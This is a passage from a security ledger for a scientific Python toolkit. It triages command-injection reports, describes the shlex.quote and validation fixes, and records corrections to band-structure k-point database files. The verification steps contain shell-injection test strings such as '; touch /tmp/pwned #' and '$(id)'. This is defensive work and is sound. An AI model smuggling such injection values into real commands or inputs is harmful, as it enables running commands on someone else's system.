- Verified: 2026-09-07. A probe file created at mode 0640
            becomes 0751 -- all three execute bits added, owner
            read and write and group read preserved, and other
            read still correctly absent. A file named
            `run X;Y $Z` -- spaces, a semicolon and a dollar
            sign, which the old `os.system` string would have
            mangled -- is made executable without incident,
            since no shell parses it any more.

---

## SEC-008 -- `graspElems.py` writes an unvalidated basis
## argument unquoted into the shell scripts it generates

- File:     `src/scripts/graspElems.py` (`build_comm_list` at
            line 208; `make_scripts` at lines 524, 528)
- Class:    Command injection into a generated script (CWE-78)
- Source:   Noticed while adjudicating SEC-006, 2026-09-07
- Severity: S3 -- real, but the payload has to be typed by the
            person who then runs the result; see the reach note
            below. Recorded as provisional while queued; the
            question became moot when both halves of the fix
            landed, so it is left at the reported ranking rather
            than argued to a conclusion nothing now depends on.
- Status:   FIXED 2026-09-07.
- Evidence: `build_comm_list` validates the ELEMENT of each
            element/basis pair but not the BASIS. In the `total`
            branch the basis is checked against
            `['MB','FB','EB']` (line 194), but in the
            single-element branch it is taken verbatim:

                basis = specs[i+1]
                ...
                tmparr.extend([token, basis])

            `make_scripts` then writes that value, unquoted,
            into the job scripts it generates:

                jobFile.write("cd "+commList[i+1]+"/"
                              +commList[i]+"\n")

            so `graspElems.py Si '; <payload> #'` produces a job
            script whose first line is
            `cd ; <payload> #/Si`. The payload runs when that
            generated script is run.

            Confirmed by running it, not by reading alone:
            `build_comm_list(['Si', '; touch /tmp/pwned #'])`
            returns `['Si', '; touch /tmp/pwned #']` unchanged,
            and the line 524 expression over that list yields
            exactly `'cd ; touch /tmp/pwned #/Si\n'`. The same
            check confirms the `total` branch does validate:
            `build_comm_list(['total','BOGUS'])` discards the
            bogus basis and expands to all three real ones.
- Reach:    Lower than it first appears, and this is why the
            severity is provisional. The value arrives as the
            user's own command-line argument, so in the ordinary
            case the person supplying the payload is the person
            it runs as -- they could simply have typed the
            command instead. It becomes a genuine crossing only
            where the argument comes from somewhere else: a
            wrapper script, a batch driver, a shared or
            generated command line, or any future caller that
            builds the spec list from a file. Decide the
            severity when the fix is worked.
- Fix:      APPLIED 2026-09-07. Two independent repairs, both
            made, because either alone would leave the safety
            resting on something outside the code that needs it:
            1. `build_comm_list`'s single-element branch now
               checks `basis != 'all' and basis not in
               all_bases` and exits with a message naming the
               three real bases, exactly as the `total` branch
               already did. This is also a plain usability
               improvement: a mistyped basis used to travel all
               the way into the directory names and the
               generated scripts, producing a broken script
               rather than an error anyone could act on.
            2. Every value interpolated into a generated shell
               script is now passed through `shlex.quote` --
               the element directory, the run script name and
               both log names. Correctness therefore no longer
               depends on the validator upstream staying strict;
               a later change that loosened it could not turn
               these lines into a way of running commands.
- Compat:   Generated job scripts are UNCHANGED for every real
            input. `shlex.quote` returns a shell-safe string
            untouched, and the legitimate values (element
            symbols and the three basis names) are all
            shell-safe, so the emitted lines are byte-identical
            to before -- verified below.
- Verified: 2026-09-07.
            * Valid specs are unaffected: `['Si','MB']`,
              `['Si','all']` and `['F','MB','H','EB']` all
              expand exactly as before, and `['total','MB']`
              still yields all 103 element pairs starting at H.
            * Four hostile bases are refused with a message
              naming the valid ones:
              `'; touch /tmp/pwned_grasp #'`, `'$(id)'`,
              `'MMB'` and `'../../etc'`.
            * Generated lines for real input are unchanged:
              `cd MB/Si` and `./runSi > Siout &`.
            * Were a hostile value ever to reach the writer, it
              is neutralised: it emits as
              `cd '; touch /tmp/pwned_grasp #/Si'` -- a single
              quoted word, not a command separator.
            * A canary confirms no payload executed.

---

## SEC-009 -- `plot_deadmd.py`: the "press Enter" pause,
## reported as reaching a command

- File:     `src/scripts/plot_deadmd.py:569` (`main`)
- Class:    Reported as command injection (CWE-78)
- Source:   Externally provided list, item 7
- Severity: S2 as reported, and fixed to that standard. The
            ranking is the one this finding would carry if it
            held -- arbitrary code execution reached through an
            installed file or an interactive prompt. Our own
            reading is set out below.
- Status:   FIXED 2026-09-07, to the standard the finding would
            demand if it were correct: the reported condition no
            longer exists in the code. Our own reading of the
            finding is recorded below and is unchanged -- see
            "Findings fixed without being agreed" for why the
            entry keeps both.
- Report:   The finding states that `main` "calls an OS (shell)
            command with input" at line 569, and that a command
            could be injected through what the user types.
- Our       The flagged statement, in full, is:
  reading: 
                if show:
                    input("All plots open -- press Enter to "
                          "close them and exit.")

            This is the same false positive as SEC-005, and here
            the case is even plainer, because the value the
            report calls untrusted is never used for anything.

            1. **The return value is discarded.** `input(...)`
               is a bare expression statement. It is not
               assigned, not chained, not passed anywhere.
               Whatever the user types is read and dropped on
               the floor. Confirmed by search: the file's only
               `input(` occurrence is this one, and it appears
               in no assignment.
            2. **The file has no execution surface.** Its whole
               import list is `sys`, `os`, `argparse`,
               `datetime`, `numpy` and two `matplotlib`
               modules. There is no `subprocess`, `os.system`,
               `os.exec*`, `popen`, `eval` or `exec` anywhere
               in it.
            3. **Python 3's `input()` does not evaluate.** As
               with SEC-005, the rule being applied is almost
               certainly the one for Python 2's `input()`, which
               really was `eval(raw_input())`. This script
               cannot run under Python 2: it declares
               `#!/usr/bin/env python3` and uses f-strings (16
               of them), which are a syntax error before 3.6.

            The statement's entire purpose is to hold the
            process open so the matplotlib windows stay on
            screen until the user is finished looking at them --
            which is why it is guarded by `if show:` and why
            nothing is done with the reply.
- Note:     Two of the external findings (SEC-005 and this one)
            are the same Python 2 `input()` rule misfiring. If a
            future scan flags a bare `input()` call, expect the
            same adjudication -- but check the destination of
            the value each time anyway, since that check is what
            distinguishes this from a real finding and is cheap
            to perform.
- Remedi-   APPLIED 2026-09-07. The `input()` call is gone, and
  ation:    with it the pattern the report matched: the script
            now reads from standard input nowhere at all.

            The pause exists only to stop the interpreter
            exiting and taking the matplotlib windows with it --
            each figure is raised with `plt.show(block=False)`
            in `save_figure`, which returns immediately. A final
            blocking `plt.show()` is matplotlib's own idiom for
            exactly that wait, so the replacement is what the
            code should have said in the first place:

                print("Close the plot windows to exit.")
                plt.show()

            This is a small behaviour improvement rather than a
            like-for-like swap, and worth stating plainly: the
            session now ends by closing the plot windows instead
            of by returning to the terminal and pressing Enter.
            That is the more natural gesture for a plotting
            tool, and it no longer requires the terminal to
            still be in the foreground.
- Verified: 2026-09-07, with one limit stated below. Checked by
            parsing and importing the module: no `input()` call
            survives anywhere in it (the syntax tree contains
            none), `main` contains the `plt.show()` that
            replaced it, `plt` is bound at module level so the
            call resolves, the module imports cleanly, and
            `plt.show()` executes without error.

            LIMIT: this is a windowing change, and the checks
            above ran headless under the Agg backend, where
            `plt.show()` returns immediately instead of
            blocking. That the figures actually stay on screen
            until closed -- the behaviour the change exists to
            provide -- has NOT been confirmed on a real display.
            It is matplotlib's documented behaviour for an
            interactive backend and the surrounding
            `plt.show(block=False)` calls were already relying
            on the same machinery, so the risk is low; but it is
            an untested claim and is recorded as one. Anyone
            running `plot_deadmd.py -show` on a workstation
            settles it in one go.

---

## SEC-010 -- `makegroups.py`: potential-database content,
## reported as reaching a subprocess call

- File:     `src/scripts/makegroups.py:367` (`_run_makeinput`),
            with the claimed source at
            `src/scripts/initial_potential_db.py:476` (`load`)
- Class:    Reported as command injection (CWE-78)
- Source:   Externally provided list, item 8
- Severity: S2 as reported, and fixed to that standard. The
            ranking is the one this finding would carry if it
            held -- arbitrary code execution reached through an
            installed file or an interactive prompt. Our own
            reading is set out below.
- Status:   FIXED 2026-09-07, to the standard the finding would
            demand if it were correct: the reported condition no
            longer exists in the code. Our own reading of the
            finding is recorded below and is unchanged -- see
            "Findings fixed without being agreed" for why the
            entry keeps both.
- Report:   The finding states that an attacker can inject a
            command into the database, that
            `initial_potential_db.load` retrieves it at line 476
            via `open(path, "rb")`, and that it then reaches
            `subprocess.run(command, ...)` in `_run_makeinput`.

            This is the most substantial of the reported items
            so far: unlike SEC-005, SEC-006 and SEC-009 it names
            a real subprocess call and describes a plausible
            two-file data flow. It still does not hold, and the
            trace below is longer because a claim of this shape
            deserves to be answered at every link rather than
            dismissed at the first one.
- Our       Three independent findings, any one of which is
  reading:  sufficient.

            **1. The claimed data flow does not exist.**
            `makegroups.py` never reads the potential database.
            It does not import `initial_potential_db`, and the
            string does not occur anywhere in the file. Its
            entire import list is `argparse`, `glob`, `os`,
            `re`, `shutil`, `subprocess`, `sys`,
            `collections.OrderedDict`, `datetime`, and two local
            modules (`matchers`, `structure_control`). There is
            no path, direct or indirect, from that loader to
            this call site.

            The values actually passed are built two lines
            above the call:

                params = matcher.to_loen_input(sub_spec)
                return [str(params['loenCode']),
                        str(params['twoj1']), ...]

            -- six named numeric LOEN parameters taken from a
            matcher's fingerprint sub-specification and
            stringified. Not database text.

            **2. There is no shell, so there is nothing to
            inject into.** The call is

                command = [sys.executable,
                           _resolve_sibling('makeinput.py'),
                           '-loeninput', *loen_values]
                subprocess.run(command, cwd=work_dir,
                               check=True)

            a list argv with `shell=False` (the default, used
            here). The elements go to `execve` as argv; no shell
            parses them, so metacharacters have no meaning. Even
            if a database string DID reach `loen_values`, it
            would arrive as one argument to `makeinput.py`, not
            as a command. `command[0]` is `sys.executable` and
            `command[1]` is `_resolve_sibling('makeinput.py')`,
            which resolves the fixed name `makeinput.py` beside
            this script or on PATH -- neither is user-supplied.

            **3. The loader deserializes TOML, which cannot
            carry code.** Line 476-477 reads

                with open(path, "rb") as handle:
                    raw = tomllib.load(handle)

            TOML is a pure data format with no code-execution
            semantics: it yields dicts, lists, strings, numbers,
            booleans and dates, and nothing else. Loading a
            hostile TOML file cannot run anything.

            The `"rb"` binary mode is worth a word, because it
            is the likely trigger for reading this as a
            dangerous "database" load. It is not a red flag
            here; it is REQUIRED by `tomllib.load`, which
            insists on a binary handle because TOML is defined
            as UTF-8 and the parser does its own decoding. In
            this file the `"rb"` is the signature of the safe
            choice rather than a risky one.
- Contrast: The distinction that matters, and the one to keep
            checking for in future items: had this been
            `pickle.load(handle)` -- which also takes a binary
            handle, and which a reader skimming for
            `open(..., "rb")` would find indistinguishable --
            the finding would have been correct and CRITICAL.
            Unpickling untrusted data executes arbitrary code by
            design, with no injection needed. The rejection here
            rests specifically on the deserializer being
            `tomllib`, not on the file being "just a database".
- Note:     `_run_makeinput` is a good model for the rest of the
            codebase: list argv, no shell, a fixed program name
            resolved locally, and only stringified numeric
            parameters interpolated. It is the shape SEC-007 and
            SEC-008 should be moved toward. `load` is likewise
            the model for a data reader -- a format with no
            execution semantics, followed by ten documented
            validation rules that raise `ValueError` naming the
            file, the entry and the field at fault.
- Remedi-   APPLIED 2026-09-07. The reported concern is that an
  ation:    untrusted string could become part of the command,
            so the arguments are now checked to be what they are
            documented to be, and the absence of a shell is
            stated rather than inherited.
            * `_NUMERIC_ARGUMENT` matches an optionally signed
              integer or decimal with an optional exponent.
              `_run_makeinput` requires every LOEN value to
              match before building the command, raising a
              `ValueError` naming the offending value otherwise.
              The values are numeric by construction already;
              the check turns that from a property of a distant
              caller into a stated precondition of this
              function, and it also turns a malformed matcher
              into a named error rather than a confusing failure
              inside makeinput's own argument parsing.
            * `shell=False` is written out at both
              `subprocess.run` calls (`_run_makeinput` and
              `_run_loen`). It is the default and behaviour is
              unchanged; the point is that a reader checking why
              these arguments need no quoting can see the answer
              on the line itself.

            No change was made to `initial_potential_db.load`.
            `tomllib` is the correct reader for that file and
            the ten validation rules already there are more
            thorough than anything this campaign would add.
- Verified: 2026-09-07. `_NUMERIC_ARGUMENT` accepts `0`, `12`,
            `3.5`, `-1.25`, `+2`, `1e-6` and `2.0E3`, and
            rejects `; touch x`, `$(id)`, `abc`, `1;2` and the
            empty string.

---

## Found in passing -- not yet triaged

New entries land here first, get an ID and a severity when
triaged, and move up into the ledger.

### NOT a security finding: four SYBD lattice paths are broken

Surfaced 2026-09-07 by the SEC-002/SEC-003 equivalence run,
which evaluated every expression in all 25 `share/sybdDB` files.
Four of them -- `monoc3`, `monoc4`, `monoc5` and `orthoi` --
contain equations that BOTH the old `eval` and the new evaluator
refuse. They fail today, they failed before this campaign
started, and the security change neither caused nor cured them.
Recorded here only so the discovery is not lost; this belongs in
`dev/DEBUG.md` or `dev/TODO.md`, and the physics should be
checked by the programmer rather than guessed at.

There are two distinct causes.

**Cause 1 -- a substitution bug in the code.** The lattice
magnitudes are substituted by searching for `" a "`, `" b "` and
`" c "` WITH surrounding spaces, a trick used to avoid colliding
with the letters inside function names like `cos` and `csc`. The
trick fails whenever the magnitude letter is not surrounded by
spaces -- at the very start of an expression, or immediately
after an opening parenthesis. The letter then survives
substitution as a bare name and the evaluation dies.

    monoc3, monoc4:  delta = b * c * cos(alpha) / (2.0 * a ** 2)
    orthoi:          delta = (b ** 2 - a ** 2) / (4.0 * c ** 2)
    orthoi:          mu    = (a ** 2 + b ** 2) / (4.0 * c ** 2)

Each begins its right-hand side with `b` or `(b`, so `" b "`
never matches. Confirmed directly: after substitution the text
still reads `b *7.0* cos(1.3) / ...` and the old `eval` raised
`NameError: name 'b' is not defined`.

**Cause 2 -- typos in the database files themselves.**

    monoc3, monoc4:  eta = 1.0 / 2.0 +  * zeta * c / b * cos(alpha)
    monoc5:          eta = 1.0 / 2.0 + 2.0 * zeta * c / b cos(alpha)
    monoc5:          zeta = (b ** 2 / a ** 2 + (1.0 - b / c *
                            cos(alpha)) / (sin(alpha)**2) / 4.0

The first has a stray `+  *` where a factor has been lost;
comparing against `monoc5` suggests the missing text is `2.0`.
The second is missing the `*` before `cos`. The third has
unbalanced parentheses. All three are syntax errors, so these
files cannot ever have run successfully in this form.

**Consequence.** Any cell whose symmetry causes
`_auto_sybd_path` to select one of these four paths cannot
generate a band-structure input at all. The failure is loud (a
traceback, now a named `ValueError`), so nothing is silently
wrong -- but the feature is unavailable for those lattices.

**RESOLVED 2026-09-07** -- see `dev/TODO.md` T4. Cause 1 was
fixed in `makeinput.py` (word-boundary substitution) and cause
2 in `src/data/sybdDB.tgz` (three files, four lines). All 25
paths now evaluate: 48 equations and 954 coordinates, no
failures, and the 38 equations that already worked are
unchanged.

### One further repair, and one physics call left open

Both surfaced during that work. Neither is a security matter.
The first was settled by the programmer and fixed; the second
is a question about what the physics should be rather than a
syntax error with one possible reading, and is left alone.

**1. `monoc2`'s `eta` divided by `c` where every sibling
divides by `b`. FIXED 2026-09-07** on the programmer's ruling,
after the evidence below was put to them. The five C-centred
monoclinic files carry the same quantity, and four of the five
were visibly corruptions of one canonical form:

    monoc1   eta = 1.0 / 2.0 + 2 * zeta * c / b * cos(alpha)
    monoc2   eta = 1.0 / 2.0 + 2 * zeta * c / c * cos(alpha)
    monoc3   eta = 1.0 / 2.0 +  * zeta * c / b * cos(alpha)
    monoc4   eta = 1.0 / 2.0 +  * zeta * c / b * cos(alpha)
    monoc5   eta = 1.0 / 2.0 + 2.0 * zeta * c / b cos(alpha)

`monoc3`, `monoc4` and `monoc5` were repaired to `monoc1`'s
form, because in each case the file was unparseable and the
missing token is the one every sibling supplies. `monoc2` is
different: `c / c` is valid arithmetic, so the file RUNS and
returns a number. It is simply the wrong number if the reading
above is right -- `c / c` is identically 1, so `monoc2`'s eta
carries no dependence on `b` at all, the very ratio it is meant
to scale by. On a representative cell (a=5, b=6, c=7,
alpha=1.3) the two forms give 0.79759904 and 0.75508489, a
difference of 0.0425 in a fractional reciprocal coordinate.

What settled it: `monoc1` and `monoc2` differ by EXACTLY ONE
CHARACTER across their entire variable block -- the `b`/`c` in
`eta` -- while their path specifications differ substantially
(5 paths and 15 k-points against 3 paths and 11). Two files
built to share a definition set and differ only in which path
is traversed is what MCLC1 and MCLC2 are; a lone differing
character inside the shared half is a slip, not a real
distinction.
Had a different `eta` been intended, it would have been written
as a different expression, not as `c / c`, which is identically
one.

Fixed to `c / b`, matching `monoc1`. `monoc2` now computes
zeta, eta, psi and phi identical to `monoc1` to every printed
digit, and the whole database still evaluates (48 equations,
954 coordinates, no failures).

NOTE for anyone comparing against earlier results: this is the
one change in this whole campaign that alters the output of a
run that previously COMPLETED. A band-structure calculation on
an MCLC2 cell run before 2026-09-07 used an `eta` too small by
0.0425 on a representative cell, and its k-point path was
correspondingly wrong. Nothing warned at the time.

**2. `monoc5`'s `H_1`, `F_1`, `I`, `I_1` and `Y_1`. FIXED
2026-09-07 by the programmer**, and checked here against the
source the database was built from: Setyawan and Curtarolo,
*High-throughput electronic band structure calculations:
Challenges and tools*, Comput. Mater. Sci. 49 (2010) 299-312.
MCLC5 is its Table 19, with the path in Fig. 21.

Five k-points had been written as negatives of the published
values -- `-1.0+rho` where the table has `1-rho`, and likewise
for `F_1`, `H_1` and `Y_1`. The symptom that drew attention to
them was `H_1`'s third component reaching -1.8542 on a test
cell, further outside the zone than anything else in the
database; the corrected file spans [-0.5675, +1.2350].

Verified point by point: all 16 k-points now match Table 19
exactly, and the path structure (4 segments of 5, 4, 5 and 2)
matches Fig. 21's Gamma-Y-F-L-I | I1-Z-H-F1 | H1-Y1-X-Gamma-N |
M-Gamma. The seven variable definitions were checked against
the same table and were already correct.

**The paper also settles the two repairs made earlier in this
section**, which had been argued from internal consistency
alone:
* Table 18 gives MCLC3/MCLC4 `eta = 1/2 + 2*zeta*c*cos(alpha)/b`
  -- confirming the factor 2 restored to `monoc3` and `monoc4`.
* Table 17 is titled "Symmetry k-points of MCLC 1 and MCLC 2"
  and carries ONE shared definition list, with
  `eta = 1/2 + 2*zeta*c*cos(alpha)/b`. That confirms both that
  `monoc2` should divide by `b` rather than `c`, and the
  structural reasoning used to reach it -- the two variations
  are meant to share their variables and differ only in path.

**Postscript: the rest of the database was audited too, and was
not clean.** Repairing five files raised the question of whether
the other twenty were sound. All 25 paths and all 302 k-point
entries were checked against the same paper (Tables 2-21 and the
figure captions). Every path is correct; TWELVE k-points across
nine files were not, and are now fixed. The worst was `teti1`,
whose M sat at the origin instead of (-1/2,1/2,1/2), so every
body-centred tetragonal band structure had run a degenerate
Gamma-X-M-Gamma segment. Written up in full as `dev/TODO.md` T5,
which is where this thread properly belongs -- it is a
correctness campaign, not a security one, and it is recorded
here only because it began inside this document's work.
